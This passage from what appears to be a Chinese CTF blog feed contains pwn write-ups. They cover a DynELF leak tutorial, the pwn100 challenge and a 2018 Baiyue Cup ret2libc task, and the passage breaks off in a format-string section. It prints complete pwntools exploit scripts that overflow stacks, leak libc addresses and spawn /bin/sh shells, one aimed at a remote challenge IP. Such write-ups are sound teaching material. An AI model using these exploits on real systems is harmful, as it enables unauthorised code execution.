class="line">很明显的栈溢出漏洞。</span><br><span class="line">这个程序比较麻烦的一点在于它是个<span class="number">64</span>位程序，且找不到可以修改rdx的gadget，因此在这里我们就可以用到之前的文章中提到的万能gadgets进行函数调用。</span><br><span class="line">首先我们来构造一个leak函数。通过对代码的分析我们发现程序中可以用来泄露信息的函数只有一个puts，已知栈溢出到rip需要<span class="number">72</span>个字节，我们很快就可以写出一个尝试泄露的脚本：</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">io = remote(<span class="string">"172.17.0.3"</span>, <span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn100"</span>)</span><br><span class="line"> </span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400763</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">"A"</span> *<span class="number">72</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(puts_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="keyword">print</span> io.recv()</span><br></pre></td></tr></table></figure><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144451gi2x2llce11x1s91.png.thumb.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">由于实际上栈溢出漏洞需要执行完puts(“bye~”)之后才会被触发，输出对应地址的数据，因此我们需要去掉前面的字符，所以可以写leak函数如下：</span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">pop_rdi = <span class="number">0x400763</span></span><br><span class="line">puts_addr = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       payload = <span class="string">"A"</span> *<span class="number">72</span></span><br><span class="line">       payload += p64(pop_rdi)</span><br><span class="line">       payload += p64(addr)</span><br><span class="line">       payload += p64(puts_addr)</span><br><span class="line">       payload += p64(start_addr)</span><br><span class="line">       payload = payload.ljust(<span class="number">200</span>, <span class="string">"B"</span>)</span><br><span class="line">       io.send(payload)</span><br><span class="line">       content = io.recv()[<span class="number">5</span>:]</span><br><span class="line">       log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br><span class="line"> 我们将其扩展成一个脚本并执行，却发现leak出错了。</span><br></pre></td></tr></table></figure><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201807/17/144516fcfb4jpzy446z5y4.png.thumb.jpg" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">通过查看输出的leak结果我们可以发现有大量的地址输出处理之后都是<span class="number">0x0a</span>，即一个回车符。从Traceback上看，最根本原因是读取数据错误。这是因为puts()的输出是不受控的，作为一个字符串输出函数，它默认把字符’\x00’作为字符串结尾，从而截断了输出。因此，我们可以根据上述博文修改leak函数:</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">       count = <span class="number">0</span></span><br><span class="line">       up = <span class="string">''</span></span><br><span class="line">       content = <span class="string">''</span></span><br><span class="line">       payload = <span class="string">'A'</span>*<span class="number">72</span>                        <span class="comment">#padding</span></span><br><span class="line">       payload += p64(pop_rdi)                  <span class="comment">#给puts()赋值</span></span><br><span class="line">       payload += p64(addr)               <span class="comment">#leak函数的参数addr</span></span><br><span class="line">       payload += p64(puts_addr)        <span class="comment">#调用puts()函数</span></span><br><span class="line">       payload += p64(start_addr)       <span class="comment">#跳转到start，恢复栈</span></span><br><span class="line">       payload = payload.ljust(<span class="number">200</span>, <span class="string">'B'</span>) <span class="comment">#padding</span></span><br><span class="line">       io.send(payload)</span><br><span class="line">       io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:                                                      <span class="comment">#无限循环读取，防止recv()读取输出不全</span></span><br><span class="line">              c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.1</span>)     <span class="comment">#每次读取一个字节，设置超时时间确保没有遗漏</span></span><br><span class="line">              count += <span class="number">1</span>                                            </span><br><span class="line">              <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:                  <span class="comment">#上一个字符是回车且读不到其他字符，说明读完了</span></span><br><span class="line">                     content = content[:<span class="number">-1</span>]+<span class="string">'\x00'</span>    <span class="comment">#最后一个字符置为\x00</span></span><br><span class="line">                     <span class="keyword">break</span></span><br><span class="line">              <span class="keyword">else</span>:</span><br><span class="line">                     content += c <span class="comment">#拼接输出</span></span><br><span class="line">                     up = c    <span class="comment">#保存最后一个字符</span></span><br><span class="line">       content = content[:<span class="number">4</span>]   <span class="comment">#截取输出的一段作为返回值，提供给DynELF处理</span></span><br><span class="line">       log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">       <span class="keyword">return</span> content</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-DynELF简介&quot;&gt;&lt;a href=&quot;#0x01-DynELF简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 DynELF简介&quot;&gt;&lt;/a&gt;0x01 DynELF简介&lt;/h3&gt;&lt;h3 id=&quot;DynELF简介&quot;&gt;&lt;a href=&quot;#D
      
    
    </summary>
    
      <category term="百度学习" scheme="http://yoursite.com/categories/%E7%99%BE%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn100</title>
    <link href="http://yoursite.com/2019/09/17/pwn100/"/>
    <id>http://yoursite.com/2019/09/17/pwn100/</id>
    <published>2019-09-17T07:38:49.789Z</published>
    <updated>2019-09-19T07:21:01.938Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码漏洞点"><a href="#源码漏洞点" class="headerlink" title="源码漏洞点"></a>源码漏洞点</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int sub_40068E()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [rsp+<span class="number">0</span>h] [rbp<span class="number">-40</span>h]</span><br><span class="line"></span><br><span class="line">  sub_40063D((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"bye~"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall sub_40063D(__int64 a1, signed int a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  signed int i; // [rsp+<span class="number">1</span>Ch] [rbp<span class="number">-4</span>h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (unsigned int)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (void *)(i + a1), <span class="number">1</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">栈溢出漏洞</span><br></pre></td></tr></table></figure><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">无libc  无system 无bin/sh</span><br><span class="line">xfgg@ubuntu:~/Downloads$ ROPgadget --binary pwn100 --only &apos;pop|ret&apos;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040075c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040075e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400760 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400762 : pop r15 ; ret</span><br><span class="line">0x000000000040075b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040075f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400595 : pop rbp ; ret</span><br><span class="line">0x0000000000400763 : pop rdi ; ret</span><br><span class="line">0x0000000000400761 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040075d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004004e1 : ret</span><br><span class="line">0x00000000004005c5 : ret 0xc148</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 12</span><br><span class="line"></span><br><span class="line">puts只需要一个参数，所以找到pop rdi; ret传参更方便</span><br><span class="line">0x0000000000400763 : pop rdi ; ret</span><br><span class="line"></span><br><span class="line">找到可写入bin/sh的地址</span><br><span class="line">gdb-peda$ vmmap</span><br><span class="line">Warning: not running</span><br><span class="line">Start              End                PermName</span><br><span class="line">0x004004c8         0x0040077d         rx-p/home/xfgg/Downloads/pwn100</span><br><span class="line">0x00400238         0x00400904         r--p/home/xfgg/Downloads/pwn100</span><br><span class="line">0x00600e10         0x00601068         rw-p/home/xfgg/Downloads/pwn100</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">io = remote(<span class="string">'111.198.29.45'</span>,<span class="number">54701</span>)</span><br><span class="line"><span class="comment">#io = process("./pwn100")</span></span><br><span class="line">elf = ELF(<span class="string">"/home/xfgg/Downloads/pwn100"</span>)</span><br><span class="line"></span><br><span class="line">rop1 = <span class="number">0x40075A</span> <span class="comment">#pop rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">rop2 = <span class="number">0x400740</span> <span class="comment">#rdx(r13), rsi(r14), edi(r15d)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400763</span></span><br><span class="line"><span class="comment"># start_addr = elf.symbols['_start']</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">binsh_addr = <span class="number">0x601000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">  payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">  payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">  io.send(payload)</span><br><span class="line">  io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line">  up = <span class="string">""</span></span><br><span class="line">  content = <span class="string">""</span></span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">'\n'</span> <span class="keyword">and</span> c == <span class="string">""</span>:</span><br><span class="line">        content = content[:<span class="number">-1</span>] + <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        content += c</span><br><span class="line">        up = c</span><br><span class="line">  content = content[:<span class="number">4</span>]</span><br><span class="line">  log.info(<span class="string">"%#x =&gt; %s"</span> % (addr, (content <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>)))</span><br><span class="line">  <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line">log.info(<span class="string">"system_addr =&gt; %#x"</span>, sys_addr)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(rop1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rop2)</span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">56</span>    <span class="comment">#rop2结束又跳转到rop1，需要再填充7 * 8字节到返回地址</span></span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">"bye~\n"</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">"a"</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码漏洞点&quot;&gt;&lt;a href=&quot;#源码漏洞点&quot; class=&quot;headerlink&quot; title=&quot;源码漏洞点&quot;&gt;&lt;/a&gt;源码漏洞点&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2018百越杯 pwn</title>
    <link href="http://yoursite.com/2019/09/13/Boring%20game/"/>
    <id>http://yoursite.com/2019/09/13/Boring game/</id>
    <published>2019-09-13T06:02:33.578Z</published>
    <updated>2019-09-13T07:04:08.289Z</updated>
    
    <content type="html"><![CDATA[<p>最近省赛要开始了，把去年的题目重新详细的做一遍 较为简单</p><p>借鉴了csdn大佬的博客</p><h3 id="栈溢出后多个地址和参数的排列顺序的规则"><a href="#栈溢出后多个地址和参数的排列顺序的规则" class="headerlink" title="栈溢出后多个地址和参数的排列顺序的规则"></a>栈溢出后多个地址和参数的排列顺序的规则</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">以一个简单的函数为例</span><br><span class="line"></span><br><span class="line">void foo(int x)</span><br><span class="line">&#123;</span><br><span class="line">int y;</span><br><span class="line">x++;</span><br><span class="line">y = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">foo(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2018121920353846.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NjYxOTkw,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在调用函数的时候，要传入的参数会放在RET之下，也就是主函数的栈空间的顶端。并且参数是根据调用的顺序依次向下排序的，也就是越早用到越上面。</span><br><span class="line">执行程序</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20181220092653787.png" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就一个NX（栈不可执行），另外还给了libc.so<span class="number">.6</span>，应该是用ret2libc</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20181220092436288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NjYxOTkw,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">溢出点很明显因为是32位的程序，payload填充84+4个字节就能完成溢出</span><br><span class="line"></span><br><span class="line">因为程序内没有现成的system函数，所以要从libc里提取，为此需要知道程序运行之后libc的加载地址，这样得到libc的加载基址后就计算出system函数在程序运行中的实际地址了。</span><br><span class="line"></span><br><span class="line">为此需要用到ret2plt，可以选的函数有puts、write、printf这些程序已经调用过的函数，因为这样plt表中就会有它们对应的got表地址，got表中就存储着这些函数的实际地址，只要控制程序跳转到函数plt表所在位置，程序会根据plt表去查找got表对应位置，从而得到函数在程序运行时的实际位置，以此调用函数。这里我选择在main函数中已经调用过的write函数来泄露got表中write的实际地址（puts和printf也都可以，区别在于参数不同）。</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*(0x54+4)+write_plt_address+game_addr+&apos;1&apos;+write_got_address+&apos;4&apos;</span><br><span class="line"></span><br><span class="line">payload先是用88个‘a’填满缓冲区和ebp，随后是plt表中存储write函数的地址（相当于call write函数），然后跟上game函数的起始地址(main函数首地址也行，目的是为了能第二次进行栈溢出），程序执行完call write后栈顶就变成了game_addr，到时候就会把game_addr当作返回地址。接下来就是write的三个参数，文件标识符，字符串指针，字符串大小。我们需要write的实际地址（puts、printf这些程序之前调用过的函数都在got表中存储着，都可以读取），而这个地址就在got表中存储着。</span><br><span class="line"></span><br><span class="line">执行完第一个payload后，获取到write函数的实际地址，用write_addr-write_libc_addr就能得到libc的加载基址。而加载基址加上libc.so.6中system的地址，就是system函数的实际地址了，同理，也能得到libc中&quot;/bin/sh&quot;字符串的地址，以此构造第二次payload。</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*88+（system_libc_addr+base_addr）+game_addr+（sh_addr+base_addr)</span><br><span class="line"></span><br><span class="line">system调用完/bin/sh后就回弹shell了，因此后面的返回地址可以随便写，反正也回不去了-.-</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s=process(<span class="string">"./pwn"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line">libc=ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">game_addr=elf.symbols[<span class="string">'game'</span>]</span><br><span class="line"> </span><br><span class="line">write_libc_addr=libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"> </span><br><span class="line">system_addr=libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"> </span><br><span class="line">sh_addr=next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span>+p32(write_plt)+p32(game_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"name ?\n"</span>,payload)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"? (0 - 1024)\n"</span>,<span class="string">"123"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(s)</span></span><br><span class="line"> </span><br><span class="line">write_addr=u32(s.recvuntil(<span class="string">"What'"</span>)[<span class="number">-9</span>:<span class="number">-5</span>]) <span class="comment">### 这一句就很迷了 跟之前写的rop不一样 也查不到到底是什么意思</span></span><br><span class="line">解决了的话会写个小tip。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> hex(write_addr)</span><br><span class="line"> </span><br><span class="line">base_addr=write_addr-write_libc_addr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">88</span>+p32(system_addr+base_addr)+p32(game_addr)+p32(sh_addr+base_addr)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"name ?\n"</span>,payload)</span><br><span class="line"> </span><br><span class="line">s.sendlineafter(<span class="string">"? (0 - 1024)\n"</span>,<span class="string">"123"</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure><h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">最基本的格式化字符串溢出</span><br><span class="line">可以看我之前关于格式化字符串漏洞的文章</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20181220155403180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM1NjYxOTkw,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、利用格式化漏洞覆盖任意地址的值，这里我们需要覆盖secret的值，所以先要找到secret的地址，在IDA中，可以看到secret在bss段：</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20181202230338363.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2、利用%k$n（k$用于获取格式化字符串中的指定参数）对指定地址进行覆盖</span><br><span class="line"></span><br><span class="line">（%n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量）</span><br><span class="line">3、在栈中找到format的位置和 char s的位置，计算出他们的偏移</span><br><span class="line"></span><br><span class="line">我们用gdb把断点定在printf处</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20181202225040934.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后运行，提示输出后，我就随便输入一个 %d%d</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20181202225210255.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">观察栈中的信息</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20181202225336403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxNzQyNzYyMzc3,size_16,color_FFFFFF,t_70" alt></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 